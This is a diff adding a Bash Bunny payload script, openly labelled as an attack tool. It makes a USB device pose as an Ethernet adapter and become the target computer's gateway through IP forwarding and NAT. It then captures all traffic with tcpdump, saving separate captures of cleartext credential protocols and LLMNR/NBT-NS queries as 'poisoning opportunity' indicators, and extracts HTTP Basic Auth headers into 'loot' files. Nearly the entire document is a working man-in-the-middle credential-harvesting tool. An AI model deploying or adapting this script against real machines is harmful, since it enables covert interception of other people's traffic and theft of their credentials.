@@ -1,0 +1,177 @@
+#!/bin/bash
+# ================================================================
+#  Payload     : Passive Network Capture
+#  Description : Bash Bunny payload — presents as a USB Ethernet
+#                adapter (RNDIS), enables IP forwarding + NAT to
+#                act as the target's default gateway, then captures
+#                all traversing traffic via tcpdump. Filters for
+#                high-value protocol events (LLMNR, NBT-NS, mDNS,
+#                HTTP, FTP, Telnet, SMTP, cleartext auth). Saves
+#                both full PCAP and protocol-filtered summaries.
+#  Target OS   : Windows (RNDIS), Linux/macOS (ECM; swap ATTACKMODE)
+#  Author      : [Operator]
+#  Device      : Bash Bunny Mk I / Mk II
+#
+#  How it works:
+#    1. Bunny presents as a USB Ethernet NIC (172.16.64.1)
+#    2. Target receives DHCP: IP=172.16.64.x, GW=172.16.64.1
+#    3. Bunny enables ip_forward + iptables NAT (traffic routes through)
+#    4. tcpdump on the USB interface captures all target traffic
+#    5. Bunny saves: full PCAP + LLMNR/NBT-NS + cleartext summaries
+#    6. LED green on completion; retrieve loot via Arming Mode
+#
+#  Pre-deployment:
+#    - Copy directory to /payloads/switch1/ (or switch2/) on Bunny
+#    - Ensure Bunny has an outbound internet path for NAT to work
+#      (Bunny eth0 or wlan0 connected to network)
+#    - Adjust CAPTURE_DURATION if needed (default: 300 seconds / 5 min)
+#
+#  Loot files in $LOOT_DIR:
+#    capture_full.pcap     — everything, for offline Wireshark analysis
+#    llmnr_nbtns.pcap      — LLMNR (UDP 5355) + NBT-NS (UDP 137) queries
+#    cleartext_creds.pcap  — HTTP/FTP/Telnet/SMTP/POP/IMAP cleartext
+#    dns_queries.txt       — extracted DNS query names (plaintext summary)
+#    http_hosts.txt        — HTTP Host headers seen
+#    capture_summary.txt   — plaintext human-readable capture stats
+# ================================================================
+
+CAPTURE_DURATION=300   # seconds (5 min default)
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET
+
+# Allow RNDIS interface and DHCP to settle
+sleep 5
+
+# ---- Detect the USB interface (RNDIS creates usb0 on Bunny) --------
+USB_IFACE=""
+for iface in usb0 usb1 eth1; do
+    if ip link show "$iface" &>/dev/null; then
+        USB_IFACE="$iface"
+        break
+    fi
+done
+
+# Fallback: find the interface serving the 172.16.64.x subnet
+if [ -z "$USB_IFACE" ]; then
+    USB_IFACE=$(ip route | awk '/172\.16\.64/{print $3}' | head -1)
+fi
+
+# Last resort
+[ -z "$USB_IFACE" ] && USB_IFACE="usb0"
+
+# ---- Setup loot directory ------------------------------------------
+mkdir -p "$LOOT_DIR"
+LOG="${LOOT_DIR}/capture_summary.txt"
+{
+    echo "=== Passive Network Capture ==="
+    echo "Timestamp : $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
+    echo "Interface : $USB_IFACE"
+    echo "Duration  : ${CAPTURE_DURATION}s"
+    echo "Target IP : ${TARGET_IP:-unknown}"
+} > "$LOG"
+
+# ---- Enable IP forwarding + NAT (target traffic flows through Bunny)
+# Determine outbound interface (anything that isn't the USB interface or lo)
+OUT_IFACE=$(ip route | awk '/^default/{print $5}' | grep -v "^$USB_IFACE$" | head -1)
+[ -z "$OUT_IFACE" ] && OUT_IFACE="eth0"
+
+echo "OutIface  : $OUT_IFACE" >> "$LOG"
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o "$OUT_IFACE" -j MASQUERADE 2>/dev/null
+iptables -A FORWARD -i "$USB_IFACE" -j ACCEPT 2>/dev/null
+iptables -A FORWARD -o "$USB_IFACE" -j ACCEPT 2>/dev/null
+echo "NAT       : enabled ($USB_IFACE -> $OUT_IFACE)" >> "$LOG"
+
+LED ATTACK
+
+# ---- Launch tcpdump captures in parallel ---------------------------
+
+# 1. Full traffic capture (everything)
+tcpdump -i "$USB_IFACE" -w "${LOOT_DIR}/capture_full.pcap" \
+    --buffer-size=4096 -q 2>/dev/null &
+PID_FULL=$!
+
+# 2. LLMNR (UDP 5355) + NBT-NS (UDP 137) + mDNS (UDP 5353)
+#    These are network poisoning opportunity indicators
+tcpdump -i "$USB_IFACE" -w "${LOOT_DIR}/llmnr_nbtns.pcap" \
+    'udp port 5355 or udp port 137 or udp port 138 or udp port 5353' \
+    2>/dev/null &
+PID_LLMNR=$!
+
+# 3. Cleartext credential protocols
+#    HTTP(80), FTP(21), Telnet(23), SMTP(25/587), POP3(110), IMAP(143),
+#    LDAP(389), HTTP-alt(8080/8000)
+tcpdump -i "$USB_IFACE" -w "${LOOT_DIR}/cleartext_creds.pcap" \
+    'tcp port 80 or tcp port 8080 or tcp port 8000 or
+     tcp port 21 or tcp port 23 or tcp port 25 or tcp port 587 or
+     tcp port 110 or tcp port 143 or tcp port 389' \
+    2>/dev/null &
+PID_CLEAR=$!
+
+# 4. DNS query logger (text extraction runs in background via tshark if available)
+tcpdump -i "$USB_IFACE" -w "${LOOT_DIR}/dns_queries.pcap" \
+    'udp port 53 or tcp port 53' 2>/dev/null &
+PID_DNS=$!
+
+# ---- Wait for capture duration ------------------------------------
+sleep "$CAPTURE_DURATION"
+
+# ---- Stop all captures --------------------------------------------
+for pid in $PID_FULL $PID_LLMNR $PID_CLEAR $PID_DNS; do
+    kill "$pid" 2>/dev/null
+done
+sleep 2  # allow buffers to flush
+
+# ---- Post-processing: extract text summaries ----------------------
+
+# DNS query names (requires tcpdump text decode)
+tcpdump -r "${LOOT_DIR}/dns_queries.pcap" -n 2>/dev/null | \
+    grep -oE '[A-Za-z0-9._-]+\.[a-z]{2,6}\?' | sort -u > "${LOOT_DIR}/dns_queries.txt" 2>/dev/null
+
+# HTTP Host headers
+tcpdump -r "${LOOT_DIR}/cleartext_creds.pcap" -A -n 2>/dev/null | \
+    grep -i '^Host:' | sort -u > "${LOOT_DIR}/http_hosts.txt" 2>/dev/null
+
+# HTTP Basic Auth (Base64 — decode offline)
+tcpdump -r "${LOOT_DIR}/cleartext_creds.pcap" -A -n 2>/dev/null | \
+    grep -i 'Authorization: Basic' | sort -u > "${LOOT_DIR}/http_basic_auth.txt" 2>/dev/null
+
+# LLMNR/NBT-NS query names (what hostnames the target is looking for)
+tcpdump -r "${LOOT_DIR}/llmnr_nbtns.pcap" -n 2>/dev/null | \
+    grep -oE '[A-Z][A-Z0-9_-]{0,14}' | sort -u > "${LOOT_DIR}/llmnr_hostnames.txt" 2>/dev/null
+
+# Capture statistics
+{
+    echo ""
+    echo "=== Capture File Sizes ==="
+    ls -lh "${LOOT_DIR}/"*.pcap 2>/dev/null || echo "(no pcap files)"
+    echo ""
+    echo "=== DNS Queries (unique) ==="
+    wc -l < "${LOOT_DIR}/dns_queries.txt" 2>/dev/null || echo 0
+    echo ""
+    echo "=== HTTP Hosts Observed ==="
+    cat "${LOOT_DIR}/http_hosts.txt" 2>/dev/null || echo "(none)"
+    echo ""
+    echo "=== HTTP Basic Auth Headers ==="
+    wc -l < "${LOOT_DIR}/http_basic_auth.txt" 2>/dev/null || echo 0
+    echo ""
+    echo "=== LLMNR/NBT-NS Hostnames Queried ==="
+    cat "${LOOT_DIR}/llmnr_hostnames.txt" 2>/dev/null || echo "(none)"
+} >> "$LOG"
+
+# ---- Cleanup NAT rules --------------------------------------------
+iptables -t nat -D POSTROUTING -o "$OUT_IFACE" -j MASQUERADE 2>/dev/null
+iptables -D FORWARD -i "$USB_IFACE" -j ACCEPT 2>/dev/null
+iptables -D FORWARD -o "$USB_IFACE" -j ACCEPT 2>/dev/null
+echo 0 > /proc/sys/net/ipv4/ip_forward
+
+# ---- Verify loot --------------------------------------------------
+PCAP_SIZE=$(stat -c '%s' "${LOOT_DIR}/capture_full.pcap" 2>/dev/null || echo 0)
+
+if [ "$PCAP_SIZE" -gt 1024 ]; then
+    LED FINISH
+else
+    echo "WARNING: capture_full.pcap is very small (${PCAP_SIZE} bytes)" >> "$LOG"
+    LED FAIL
+fi
